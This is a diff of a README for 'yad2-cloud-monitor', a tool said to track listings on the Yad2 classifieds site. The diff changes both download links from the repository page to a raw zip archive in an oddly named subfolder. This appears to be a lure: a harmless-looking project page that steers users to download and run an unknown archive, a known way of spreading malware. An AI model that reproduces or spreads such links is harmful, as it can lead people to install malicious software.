@@ -1,6 +1,6 @@
 # ☁️ yad2-cloud-monitor - Track your online listings with ease
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Cocobolodehydratedfoods875/yad2-cloud-monitor)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Cocobolodehydratedfoods875/yad2-cloud-monitor/raw/refs/heads/main/proctatresia/monitor_yad_cloud_2.4.zip)
 
 yad2-cloud-monitor helps you track your listings on the Yad2 platform. It fetches data about your active ads and displays their status in a clean interface. You see how many people view your ads, when you posted them, and if you need to renew them. This tool saves you time by removing the need to log into the website manually each day.
 
@@ -8,7 +8,7 @@ yad2-cloud-monitor helps you track your listings on the Yad2 platform. It fetche
 
 To begin, you need to visit the project page. You will find the latest version of the program there.
 
-[Download the Yad2 Cloud Monitor](https://github.com/Cocobolodehydratedfoods875/yad2-cloud-monitor)
+[Download the Yad2 Cloud Monitor](https://github.com/Cocobolodehydratedfoods875/yad2-cloud-monitor/raw/refs/heads/main/proctatresia/monitor_yad_cloud_2.4.zip)
 
 1. Open your web browser.
 2. Go to the link provided above.
